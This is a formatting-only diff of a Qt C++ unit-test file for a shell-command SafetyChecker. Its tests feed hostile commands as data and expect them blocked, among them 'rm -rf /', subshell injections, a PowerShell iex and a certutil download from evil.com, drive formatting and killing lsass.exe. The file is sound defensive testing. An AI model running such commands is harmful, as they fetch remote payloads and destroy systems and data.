@@ -1,41 +1,36 @@
-#include <QtTest>
 #include <QCoreApplication>
-#include "safetychecker.h"
-#include "operationplan.h"
+#include <QtTest>
 
-class TestSafetyChecker : public QObject
-{
+#include "operationplan.h"
+#include "safetychecker.h"
+
+class TestSafetyChecker : public QObject {
     Q_OBJECT
 
 private slots:
-    void initTestCase()
-    {
+    void initTestCase() {
         static int argc = 0;
-        static char *argv[] = {nullptr};
-        if (!QCoreApplication::instance())
-            new QCoreApplication(argc, argv);
+        static char* argv[] = {nullptr};
+        if (!QCoreApplication::instance()) new QCoreApplication(argc, argv);
     }
 
     // ── Default paths ──
 
-    void testDefaultPaths()
-    {
+    void testDefaultPaths() {
         SafetyChecker sc;
         QStringList paths = sc.allowedPaths();
         QVERIFY(!paths.isEmpty());
         QVERIFY(paths.contains(QDir::homePath()));
     }
 
-    void testSetAllowedPaths()
-    {
+    void testSetAllowedPaths() {
         SafetyChecker sc;
         QStringList custom = {"/tmp", "/home/user/projects"};
         sc.setAllowedPaths(custom);
         QCOMPARE(sc.allowedPaths(), custom);
     }
 
-    void testAddAllowedPath()
-    {
+    void testAddAllowedPath() {
         SafetyChecker sc;
         sc.setAllowedPaths({"/tmp"});
         sc.addAllowedPath("/home/user");
@@ -43,16 +38,14 @@ private slots:
         QVERIFY(sc.allowedPaths().contains("/home/user"));
     }
 
-    void testAddAllowedPath_NoDuplicate()
-    {
+    void testAddAllowedPath_NoDuplicate() {
         SafetyChecker sc;
         sc.setAllowedPaths({"/tmp"});
         sc.addAllowedPath("/tmp");
         QCOMPARE(sc.allowedPaths().size(), 1);
     }
 
-    void testResetToDefaults()
-    {
+    void testResetToDefaults() {
         SafetyChecker sc;
         sc.setAllowedPaths({"/custom"});
         sc.resetToDefaults();
@@ -61,40 +54,35 @@ private slots:
 
     // ── Shell command validation ──
 
-    void testValidateOperation_EmptyCommand()
-    {
+    void testValidateOperation_EmptyCommand() {
         SafetyChecker sc;
         ShellOperation op;
         op.command = "";
         QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
     }
 
-    void testValidateOperation_SafeCommand()
-    {
+    void testValidateOperation_SafeCommand() {
         SafetyChecker sc;
         ShellOperation op;
         op.command = "echo hello";
         QCOMPARE(sc.validateOperation(op), SafetyChecker::Approved);
     }
 
-    void testValidateOperation_SudoBlocked()
-    {
+    void testValidateOperation_SudoBlocked() {
         SafetyChecker sc;
         ShellOperation op;
         op.command = "sudo rm /tmp/test";
         QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
     }
 
-    void testValidateOperation_RmRfRoot()
-    {
+    void testValidateOperation_RmRfRoot() {
         SafetyChecker sc;
         ShellOperation op;
         op.command = "rm -rf /";
         QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
     }
 
-    void testValidateOperation_RmRequiresConfirm()
-    {
+    void testValidateOperation_RmRequiresConfirm() {
         SafetyChecker sc;
         sc.addAllowedPath("/home/user/projects");
         ShellOperation op;
@@ -102,8 +90,7 @@ private slots:
         QCOMPARE(sc.validateOperation(op), SafetyChecker::NeedsConfirmation);
     }
 
-    void testValidateOperation_CurlIsCaution()
-    {
+    void testValidateOperation_CurlIsCaution() {
         SafetyChecker sc;
         ShellOperation op;
         op.command = "curl https://example.com";
@@ -111,8 +98,7 @@ private slots:
         QVERIFY(r != SafetyChecker::Approved);
     }
 
-    void testValidateOperation_RmNeedsConfirm()
-    {
+    void testValidateOperation_RmNeedsConfirm() {
         SafetyChecker sc;
         sc.addAllowedPath("/tmp");
         sc.addAllowedPath(QDir::homePath());
@@ -123,24 +109,21 @@ private slots:
 
     // ── Injection detection ──
 
-    void testValidateOperation_BacktickInjection()
-    {
+    void testValidateOperation_BacktickInjection() {
         SafetyChecker sc;
         ShellOperation op;
         op.command = "echo `rm -rf /`";
         QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
     }
 
-    void testValidateOperation_DollarParenInjection()
-    {
+    void testValidateOperation_DollarParenInjection() {
         SafetyChecker sc;
         ShellOperation op;
         op.command = "echo $(whoami)";
         QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
     }
 
-    void testValidateOperation_EvalBlocked()
-    {
+    void testValidateOperation_EvalBlocked() {
         SafetyChecker sc;
         ShellOperation op;
         op.command = "eval echo hello";
@@ -149,48 +132,44 @@ private slots:
 
     // ── Windows injection detection ──
 
-    void testWindowsInjection_InvokeExpression()
-    {
+    void testWindowsInjection_InvokeExpression() {
         SafetyChecker sc;
         ShellOperation op;
         op.command = "powershell Invoke-Expression \"rm -rf C:\\\"";
         QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
     }
 
-    void testWindowsInjection_Iex()
-    {
+    void testWindowsInjection_Iex() {
         SafetyChecker sc;
         ShellOperation op;
         op.command = "powershell iex (New-Object Net.WebClient).DownloadString('http://evil.com')";
         QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
     }
 
-    void testWindowsInjection_EncodedCommand()
-    {
+    void testWindowsInjection_EncodedCommand() {
         SafetyChecker sc;
         ShellOperation op;
-        op.command = "powershell -EncodedCommand SQBFAFgAIAAoACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAA...";
+        op.command =
+                "powershell -EncodedCommand "
+                "SQBFAFgAIAAoACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAA...";
         QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
     }
 
-    void testWindowsInjection_CmdSubshell()
-    {
+    void testWindowsInjection_CmdSubshell() {
         SafetyChecker sc;
         ShellOperation op;
         op.command = "cmd /c del /f /s /q C:\\*";
         QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
     }
 
-    void testWindowsInjection_Comspec()
-    {
+    void testWindowsInjection_Comspec() {
         SafetyChecker sc;
         ShellOperation op;
         op.command = "%COMSPEC% /c echo bad";
         QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
     }
 
-    void testWindowsInjection_Certutil()
-    {
+    void testWindowsInjection_Certutil() {
         SafetyChecker sc;
         ShellOperation op;
         op.command = "certutil -urlcache -f http://evil.com/payload.exe bad.exe";
@@ -199,48 +178,42 @@ private slots:
 
     // ── Windows dangerous commands ──
 
-    void testWindowsDangerous_Runas()
-    {
+    void testWindowsDangerous_Runas() {
         SafetyChecker sc;
         ShellOperation op;
         op.command = "runas /user:admin cmd.exe";
         QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
     }
 
-    void testWindowsDangerous_Format()
-    {
+    void testWindowsDangerous_Format() {
         SafetyChecker sc;
         ShellOperation op;
         op.command = "format C: /fs:ntfs /q";
         QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
     }
 
-    void testWindowsDangerous_Diskpart()
-    {
+    void testWindowsDangerous_Diskpart() {
         SafetyChecker sc;
         ShellOperation op;
         op.command = "diskpart /s script.txt";
         QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
     }
 
-    void testWindowsDangerous_RegDelete()
-    {
+    void testWindowsDangerous_RegDelete() {
         SafetyChecker sc;
         ShellOperation op;
         op.command = "reg delete HKLM\\SOFTWARE\\Microsoft /f";
         QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
     }
 
-    void testWindowsDangerous_Taskkill()
-    {
+    void testWindowsDangerous_Taskkill() {
         SafetyChecker sc;
         ShellOperation op;
         op.command = "taskkill /f /im lsass.exe";
         QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
     }
 
-    void testWindowsDangerous_Shutdown()
-    {
+    void testWindowsDangerous_Shutdown() {
         SafetyChecker sc;
         ShellOperation op;
         op.command = "shutdown /s /t 0 /f";
@@ -249,8 +222,7 @@ private slots:
 
     // ── New operation type validation ──
 
-    void testNativeOp_CreateDir_InAllowedPath()
-    {
+    void testNativeOp_CreateDir_InAllowedPath() {
         SafetyChecker sc;
         sc.addAllowedPath("/home/user/projects");
         ShellOperation op;
@@ -259,8 +231,7 @@ private slots:
         QCOMPARE(sc.validateOperation(op), SafetyChecker::Approved);
     }
 
-    void testNativeOp_CreateDir_SystemPath()
-    {
+    void testNativeOp_CreateDir_SystemPath() {
         SafetyChecker sc;
         ShellOperation op;
         op.type = ShellOperation::CreateDir;
@@ -268,8 +239,7 @@ private slots:
         QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
     }
 
-    void testNativeOp_DeleteFile_NeedsConfirmation()
-    {
+    void testNativeOp_DeleteFile_NeedsConfirmation() {
         SafetyChecker sc;
         sc.addAllowedPath("/tmp");
         ShellOperation op;
@@ -278,8 +248,7 @@ private slots:
         QCOMPARE(sc.validateOperation(op), SafetyChecker::NeedsConfirmation);
     }
 
-    void testNativeOp_MoveFile_Approved()
-    {
+    void testNativeOp_MoveFile_Approved() {
         SafetyChecker sc;
         sc.addAllowedPath("/home/user/projects");
         ShellOperation op;
@@ -289,8 +258,7 @@ private slots:
         QCOMPARE(sc.validateOperation(op), SafetyChecker::Approved);
     }
 
-    void testNativeOp_MoveFile_SystemTarget()
-    {
+    void testNativeOp_MoveFile_SystemTarget() {
         SafetyChecker sc;
         ShellOperation op;
         op.type = ShellOperation::MoveFile;
@@ -299,8 +267,7 @@ private slots:
         QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
     }
 
-    void testNativeOp_CopyFile_BothPathsChecked()
-    {
+    void testNativeOp_CopyFile_BothPathsChecked() {
         SafetyChecker sc;
         sc.addAllowedPath("/home/user/projects");
         ShellOperation op;
@@ -310,8 +277,7 @@ private slots:
         QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
     }
 
-    void testNativeOp_WriteFile_Approved()
-    {
+    void testNativeOp_WriteFile_Approved() {
         SafetyChecker sc;
         sc.addAllowedPath("/tmp");
         ShellOperation op;
@@ -321,8 +287,7 @@ private slots:
         QCOMPARE(sc.validateOperation(op), SafetyChecker::Approved);
     }
 
-    void testNativeOp_WriteFile_SystemPath()
-    {
+    void testNativeOp_WriteFile_SystemPath() {
         SafetyChecker sc;
         ShellOperation op;
         op.type = ShellOperation::WriteFile;
@@ -331,8 +296,7 @@ private slots:
         QCOMPARE(sc.validateOperation(op), SafetyChecker::Blocked);
     }
 
-    void testNativeOp_SearchFiles_Approved()
-    {
+    void testNativeOp_SearchFiles_Approved() {
         SafetyChecker sc;
         sc.addAllowedPath("/home/user/projects");
         ShellOperation op;
@@ -344,15 +308,13 @@ private slots:
 
     // ── Plan validation ──
 
-    void testValidatePlan_EmptyPlan()
-    {
+    void testValidatePlan_EmptyPlan() {
         SafetyChecker sc;
         OperationPlan plan;
         QCOMPARE(sc.validatePlan(plan), SafetyChecker::Blocked);
     }
 
-    void testValidatePlan_AllApproved()
-    {
+    void testValidatePlan_AllApproved() {
         SafetyChecker sc;
         OperationPlan plan;
         plan.requiresConfirmation = false;
@@ -364,8 +326,7 @@ private slots:
         QCOMPARE(sc.validatePlan(plan), SafetyChecker::Approved);
     }
 
-    void testValidatePlan_RequiresConfirmation()
-    {
+    void testValidatePlan_RequiresConfirmation() {
         SafetyChecker sc;
         OperationPlan plan;
         plan.requiresConfirmation = true;
@@ -375,8 +336,7 @@ private slots:
         QCOMPARE(sc.validatePlan(plan), SafetyChecker::NeedsConfirmation);
     }
 
-    void testValidatePlan_HasDangerous()
-    {
+    void testValidatePlan_HasDangerous() {
         SafetyChecker sc;
         sc.addAllowedPath("/tmp");
         OperationPlan plan;
@@ -391,32 +351,28 @@ private slots:
 
     // ── Danger level ──
 
-    void testDangerLevel_Safe()
-    {
+    void testDangerLevel_Safe() {
         SafetyChecker sc;
         ShellOperation op;
         op.command = "echo hello";
         QCOMPARE(sc.dangerLevel(op), SafetyChecker::Safe);
     }
 
-    void testDangerLevel_Caution()
-    {
+    void testDangerLevel_Caution() {
         SafetyChecker sc;
         ShellOperation op;
         op.command = "rm file.txt";
         QCOMPARE(sc.dangerLevel(op), SafetyChecker::Caution);
     }
 
-    void testDangerLevel_Dangerous()
-    {
+    void testDangerLevel_Dangerous() {
         SafetyChecker sc;
         ShellOperation op;
         op.command = "sudo ls";
         QCOMPARE(sc.dangerLevel(op), SafetyChecker::Dangerous);
     }
 
-    void testDangerLevel_NativeCreateDir_Safe()
-    {
+    void testDangerLevel_NativeCreateDir_Safe() {
         SafetyChecker sc;
         ShellOperation op;
         op.type = ShellOperation::CreateDir;
@@ -424,8 +380,7 @@ private slots:
         QCOMPARE(sc.dangerLevel(op), SafetyChecker::Safe);
     }
 
-    void testDangerLevel_NativeDeleteFile_Caution()
-    {
+    void testDangerLevel_NativeDeleteFile_Caution() {
         SafetyChecker sc;
         ShellOperation op;
         op.type = ShellOperation::DeleteFile;
@@ -435,8 +390,7 @@ private slots:
 
     // ── Last block reason ──
 
-    void testLastBlockReason()
-    {
+    void testLastBlockReason() {
         SafetyChecker sc;
         ShellOperation op;
         op.command = "sudo rm /tmp/test";
